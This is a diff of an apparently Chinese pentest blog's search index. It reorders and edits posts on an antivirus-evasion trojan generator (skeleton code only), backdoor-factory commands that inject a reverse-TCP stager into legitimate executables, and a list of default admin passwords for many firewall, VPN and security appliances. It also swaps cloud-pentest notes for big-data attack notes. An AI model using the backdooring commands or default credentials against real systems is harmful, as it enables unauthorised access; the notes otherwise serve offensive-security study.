@@ -116,7 +116,8 @@
 <h3 id="倒着走"><a href="#倒着走" class="headerlink" title="倒着走"></a>倒着走</h3><h4 id="一、免杀源码"><a href="#一、免杀源码" class="headerlink" title="一、免杀源码"></a>一、免杀源码</h4><p>免杀的源码网上有很多，源码中大致分为几块：shellcode、反沙箱、混淆加密方式、执行方式。<br>此处以C++源码为例：</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> ....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">"shellcode"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">    		反沙箱代码</span><br><span class="line">                </span><br><span class="line">            混淆加密方式</span><br><span class="line">                </span><br><span class="line">            执行方式</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
 <p>网上有很多大佬们都分享过自己的思路，可以针对这几部分内容针对性的做自己需要的修改，此处不细讲。<br>参考：<br><a href="https://www.ired.team/" target="_blank" rel="noopener">https://www.ired.team/</a><br><a href="https://idiotc4t.com/" target="_blank" rel="noopener">https://idiotc4t.com/</a><br></p>
-<h4 id="二、编译源码"><a href="#二、编译源码" class="headerlink" title="二、编译源码"></a>二、编译源码</h4><p>有了C++免杀源码，那在平常项目中也可以使用Visual Studio或其他方式进行编译，但这不是本文本意。所以我们需要用C#写一个免杀生成器的框架，在后续使用中即可直接生成所需要配置的免杀木马。<br>为什么用C#而不用C++编写框架？第一是因为C#上手要比C++快（个人觉得），代码没有C++那么复杂，学习成本低。第二是因为在微软的文档中并未找到关于在程序中对C++代码编译的实现，所以编译C++免杀源码时依旧需要使用GCC。第三是如果后续对于免杀方式的源码类型有新的需求，例如除C++语言的免杀源码外还想加入C#语言的免杀源码时，正好可以使用微软已经实现的CSharpCodeProvider类来方便C#代码编译操作。没错[破涕为笑]，微软实现了C#代码的编译，但是没实现C++的。。。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20362568/1627010122698-e747a135-95b1-44df-ad37-f120790e7251.png#align=left&display=inline&height=287&margin=%5Bobject%20Object%5D&name=image.png&originHeight=574&originWidth=1808&size=116434&status=done&style=none&width=904" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/20362568/1627011094864-ef9301d4-3569-45d5-9553-ad2c34717106.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&name=image.png&originHeight=372&originWidth=670&size=38395&status=done&style=none&width=335" alt="image.png"><br>对于在C#程序中调用gcc编译C++代码，我们可以先将C++代码写一个类里，如下C#代码：</p>
+<h4 id="二、编译源码"><a href="#二、编译源码" class="headerlink" title="二、编译源码"></a>二、编译源码</h4><p>有了C++免杀源码，那在平常项目中也可以使用Visual Studio或其他方式进行编译，但这不是本文本意。所以我们需要用C#写一个免杀生成器的框架，在后续使用中即可直接生成所需要配置的免杀木马。<br>为什么用C#而不用C++编写框架？第一是因为C#上手要比C++快（个人觉得），代码没有C++那么复杂，学习成本低。第二是因为在微软的文档中并未找到关于在程序中对C++代码编译的实现，所以编译C++免杀源码时依旧需要使用GCC。第三是如果后续对于免杀方式的源码类型有新的需求，例如除C++语言的免杀源码外还想加入C#语言的免杀源码时，正好可以使用微软已经实现的CSharpCodeProvider类来方便C#代码编译操作。没错[破涕为笑]，微软实现了C#代码的编译，但是没实现C++的。。。<br><br><img src="https://i.loli.net/2021/08/16/ilq3p5AP6QVOdwI.png" alt="image.png"><br></p>
+<p><img src="https://i.loli.net/2021/08/16/UOehQiJmVbTNYDx.png" alt="image-1.png"><br><br>对于在C#程序中调用gcc编译C++代码，我们可以先将C++代码写一个类里，如下C#代码：</p>
 <figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CPP_Direct.cs</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">CPP_Direct</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> Base_Code = <span class="string">@"</span></span><br><span class="line"><span class="string">#include ....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">unsigned char buf[] = "</span>shellcode<span class="string">";</span></span><br><span class="line"><span class="string">int main()</span></span><br><span class="line"><span class="string">		&#123;</span></span><br><span class="line"><span class="string">    		反沙箱代码</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">            混淆加密方式</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">            执行方式</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">			return 0;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        "</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>需要注意的是使用@符号时，2个双引号在输出时候等价于1个双引号，即@”….”;内的代码（C++/C#源代码）要把单引号再加一个单引号进行转义，另外比如shellcode段可以用两个花括号括起来，以便后面替换数据。修改后的代码如下：</p>
 <figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">.....</span><br><span class="line">    </span><br><span class="line">unsigned <span class="keyword">char</span> buf[] = <span class="string">""</span>&#123;&#123;shellcode&#125;&#125;<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
@@ -4336,21 +4337,6 @@
       </tags>
   </entry>
   <entry>
-    <title>shellcode注入工具—backdoor-factory</title>
-    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
-    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>
-
-<p>生成好之后可以对比一下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>
-
-<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
-]]></content>
-      <tags>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vssadmin获取NTDS实操</title>
     <url>/2019/09/19/vssadmin%E8%8E%B7%E5%8F%96NTDS%E5%AE%9E%E6%93%8D/</url>
     <content><![CDATA[<p>把昨天发的vssadmin获取ntds数据库的文章实际操作了一下<br>这里使用的是God.org单域环境(更新1)，我的目的只是实操vssadmin所以不搞的太复杂<br><img src="https://i.loli.net/2019/11/11/gKbpe8clSqTjYZ9.png" alt="Image-1.png"></p><a id="more"></a>
@@ -4389,6 +4375,21 @@
 ]]></content>
       <tags>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shellcode注入工具—backdoor-factory</title>
+    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
+    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>
+
+<p>生成好之后可以对比一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>
+
+<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
+]]></content>
+      <tags>
+        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -4790,6 +4791,18 @@
       </tags>
   </entry>
   <entry>
+    <title>各大厂商设备默认密码</title>
+    <url>/2019/09/15/%E5%90%84%E5%A4%A7%E5%8E%82%E5%95%86%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119</span><br><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）</span><br><span class="line">登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</span><br><span class="line">深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251</span><br><span class="line">https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430</span><br><span class="line">启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766</span><br><span class="line">https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</span><br><span class="line">juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen</span><br><span class="line">Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco</span><br><span class="line">Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123</span><br><span class="line">H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430</span><br><span class="line">绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效</span><br><span class="line">网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220</span><br><span class="line">深信服VPN： 51111端口 delanrecover</span><br><span class="line">华为VPN：账号：root 密码：mduadmin</span><br><span class="line">华为防火墙： admin Admin@123 eudemon</span><br><span class="line">eudemon Juniper防火墙： netscreen netscreen</span><br><span class="line">迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</span><br><span class="line">山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</span><br><span class="line">安恒的明御防火墙 admin/adminadmin</span><br><span class="line">某堡垒机 shterm/shterm</span><br><span class="line">天融信的vpn test/123456</span><br></pre></td></tr></table></figure><a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绿盟安全产品默认密码排查列表</span><br><span class="line"></span><br><span class="line">IPS入侵防御系统、SAS­H运维安全管理系统、SAS安全审计系统、DAS数据库审计系统、RSAS远程安全评估系统、WAF WEB应用防护系统</span><br><span class="line">sysauditor/sysauditor</span><br><span class="line">sysmanager/sysmanager</span><br><span class="line">supervisor/supervisor</span><br><span class="line">maintainer/maintainer</span><br><span class="line">webpolicy/webpolicy</span><br><span class="line">sysadmin/sysadmin</span><br><span class="line">conadmin/conadmin</span><br><span class="line">supervis/supervis</span><br><span class="line">webaudit/webaudit</span><br><span class="line">sysadmin/sysadmin</span><br><span class="line">conadmin/nsfocus</span><br><span class="line">weboper/weboper</span><br><span class="line">auditor/auditor</span><br><span class="line">weboper/weboper</span><br><span class="line">nsadmin/nsadmin</span><br><span class="line">admin/nsfocus</span><br><span class="line">admin/admin</span><br><span class="line">shell/shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/09/19/mt4nfPpGKLvEiBh.png" alt="WechatIMG30.png"></p>
+]]></content>
+      <tags>
+        <tag>记录</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>后渗透权限维持–SharPersist</title>
     <url>/2019/09/15/%E5%90%8E%E6%B8%97%E9%80%8F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E2%80%93SharPersist/</url>
     <content><![CDATA[<p>我从github上下载下来，放在virscan上和virustotal上查杀了一下，以下为对比信息。</p><a id="more"></a>
@@ -4812,18 +4825,6 @@
 ]]></content>
       <tags>
         <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>各大厂商设备默认密码</title>
-    <url>/2019/09/15/%E5%90%84%E5%A4%A7%E5%8E%82%E5%95%86%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119</span><br><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）</span><br><span class="line">登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</span><br><span class="line">深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251</span><br><span class="line">https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430</span><br><span class="line">启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766</span><br><span class="line">https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</span><br><span class="line">juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen</span><br><span class="line">Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco</span><br><span class="line">Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123</span><br><span class="line">H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430</span><br><span class="line">绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效</span><br><span class="line">网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220</span><br><span class="line">深信服VPN： 51111端口 delanrecover</span><br><span class="line">华为VPN：账号：root 密码：mduadmin</span><br><span class="line">华为防火墙： admin Admin@123 eudemon</span><br><span class="line">eudemon Juniper防火墙： netscreen netscreen</span><br><span class="line">迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</span><br><span class="line">山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</span><br><span class="line">安恒的明御防火墙 admin/adminadmin</span><br><span class="line">某堡垒机 shterm/shterm</span><br><span class="line">天融信的vpn test/123456</span><br></pre></td></tr></table></figure><a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绿盟安全产品默认密码排查列表</span><br><span class="line"></span><br><span class="line">IPS入侵防御系统、SAS­H运维安全管理系统、SAS安全审计系统、DAS数据库审计系统、RSAS远程安全评估系统、WAF WEB应用防护系统</span><br><span class="line">sysauditor/sysauditor</span><br><span class="line">sysmanager/sysmanager</span><br><span class="line">supervisor/supervisor</span><br><span class="line">maintainer/maintainer</span><br><span class="line">webpolicy/webpolicy</span><br><span class="line">sysadmin/sysadmin</span><br><span class="line">conadmin/conadmin</span><br><span class="line">supervis/supervis</span><br><span class="line">webaudit/webaudit</span><br><span class="line">sysadmin/sysadmin</span><br><span class="line">conadmin/nsfocus</span><br><span class="line">weboper/weboper</span><br><span class="line">auditor/auditor</span><br><span class="line">weboper/weboper</span><br><span class="line">nsadmin/nsadmin</span><br><span class="line">admin/nsfocus</span><br><span class="line">admin/admin</span><br><span class="line">shell/shell</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/09/19/mt4nfPpGKLvEiBh.png" alt="WechatIMG30.png"></p>
-]]></content>
-      <tags>
-        <tag>记录</tag>
       </tags>
   </entry>
   <entry>
@@ -5206,20 +5207,28 @@
       </tags>
   </entry>
   <entry>
-    <title>（五）渗透技巧—云环境</title>
-    <url>/2019/04/15/%EF%BC%88%E4%BA%94%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E4%BA%91%E7%8E%AF%E5%A2%83/</url>
+    <title>（六）渗透技巧—大数据</title>
+    <url>/2019/04/15/%EF%BC%88%E5%85%AD%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%A4%A7%E6%95%B0%E6%8D%AE/</url>
     <content><![CDATA[<blockquote>
 <p>文章不记得从哪个公众号上拉下来的了</p>
 </blockquote><a id="more"></a>
-<h3 id="1、VMware"><a href="#1、VMware" class="headerlink" title="1、VMware"></a>1、VMware</h3><p>使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。<br>一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口（很多）：</span><br><span class="line">https://kb.vmware.com/s/article/2115330</span><br><span class="line">https://kb.vmware.com/s/article/2081930</span><br><span class="line"></span><br><span class="line">漏洞：</span><br><span class="line">•   主机逃逸</span><br><span class="line">•   CVE-2017-5638</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/348/</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/articles/system/141179.html</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/100651.html</span><br><span class="line"></span><br><span class="line">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html</span><br><span class="line"></span><br><span class="line">Tweets by VMwareSRC</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1</span><br><span class="line"></span><br><span class="line">https://www.vmware.com/cn/security/hardening-guides.html</span><br></pre></td></tr></table></figure>
-<h3 id="2、OpenStack"><a href="#2、OpenStack" class="headerlink" title="2、OpenStack"></a>2、OpenStack</h3><p>OpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。</span><br><span class="line">•   权限绕过漏洞</span><br><span class="line">•   信息泄露</span><br><span class="line">•   代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/news/topnews/107203.html</span><br></pre></td></tr></table></figure>
-<h3 id="3、Docker"><a href="#3、Docker" class="headerlink" title="3、Docker"></a>3、Docker</h3><p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
-<p>Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。</p>
-<p>Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。</p>
-<p>从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd - nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）：</span><br><span class="line">•   CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞</span><br><span class="line">•   CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞</span><br><span class="line">•   CVE-2014-9358 1.3.3 Docker 目录遍历漏洞</span><br><span class="line">•   CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞</span><br><span class="line">•   内核漏洞（Kernel exploits）容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。</span><br><span class="line">•   拒绝服务攻击（Denial-of-service attacks）所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。</span><br><span class="line">•   容器突破（Container breakouts）Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。</span><br><span class="line">•   有毒镜像（Poisoned images）主要是考虑到镜像本身的安全性，没太多好说的。</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://toutiao.io/posts/2y9xx8/preview</span><br><span class="line"></span><br><span class="line">http://www.yunweipai.com/archives/21610.html</span><br><span class="line"></span><br><span class="line">http://www.91ri.org/15837.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/ruidu_doer/article/details/53401523</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://dockone.io/article/150</span><br><span class="line"></span><br><span class="line">http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8</span><br><span class="line"></span><br><span class="line">https://blog.waterstrong.me/docker-security/</span><br></pre></td></tr></table></figure>
+<h3 id="1、Elsaticsearch"><a href="#1、Elsaticsearch" class="headerlink" title="1、Elsaticsearch"></a>1、Elsaticsearch</h3><p>Elasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：9200、9300</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   未授权访问；</span><br><span class="line">•   远程命令执行；</span><br><span class="line">•   文件遍历；</span><br><span class="line">•   低版本webshell植入；</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/sectool/38025.html</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/5401.html</span><br></pre></td></tr></table></figure>
+<h3 id="2、hadoop"><a href="#2、hadoop" class="headerlink" title="2、hadoop"></a>2、hadoop</h3><p>Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。</p>
+<p>Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。</p>
+<p>用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。 Hadoop就是一个分布式计算的解决方案。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://tech.meituan.com/hadoop-security-practice.html</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/33525241</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/85343</span><br><span class="line"></span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html</span><br></pre></td></tr></table></figure>
+<h3 id="3、Hive"><a href="#3、Hive" class="headerlink" title="3、Hive"></a>3、Hive</h3><p>Hive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://cwiki.apache.org/confluence/display/Hive/Security</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/yejibigdata/p/6394719.html</span><br></pre></td></tr></table></figure>
+<h3 id="4、Sqoop"><a href="#4、Sqoop" class="headerlink" title="4、Sqoop"></a>4、Sqoop</h3><p>Apache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。</p>
+<p>用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://sqoop.apache.org/docs/1.99.7/security.html</span><br></pre></td></tr></table></figure>
+<h3 id="5、HBase"><a href="#5、HBase" class="headerlink" title="5、HBase"></a>5、HBase</h3><p>HBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。</p>
+<p>它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。</p>
+<p>与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html</span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html</span><br></pre></td></tr></table></figure>
+<h3 id="6、Spark"><a href="#6、Spark" class="headerlink" title="6、Spark"></a>6、Spark</h3><p>Spark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905</span><br></pre></td></tr></table></figure>
 
 
 
@@ -5228,6 +5237,54 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（二）渗透技巧—常见运维系统</title>
+    <url>/2019/04/15/%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%B8%B8%E8%A7%81%E8%BF%90%E7%BB%B4%E7%B3%BB%E7%BB%9F/</url>
+    <content><![CDATA[<blockquote>
+<p>文章不记得从哪个公众号上拉下来的了</p>
+</blockquote><a id="more"></a>
+<p>一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。<br>内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。</p>
+<h3 id="1、Gitlab"><a href="#1、Gitlab" class="headerlink" title="1、Gitlab"></a>1、Gitlab</h3><p>GitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的项目仓库，可通过Web界面进行访问公开的或者私人项目。</p>
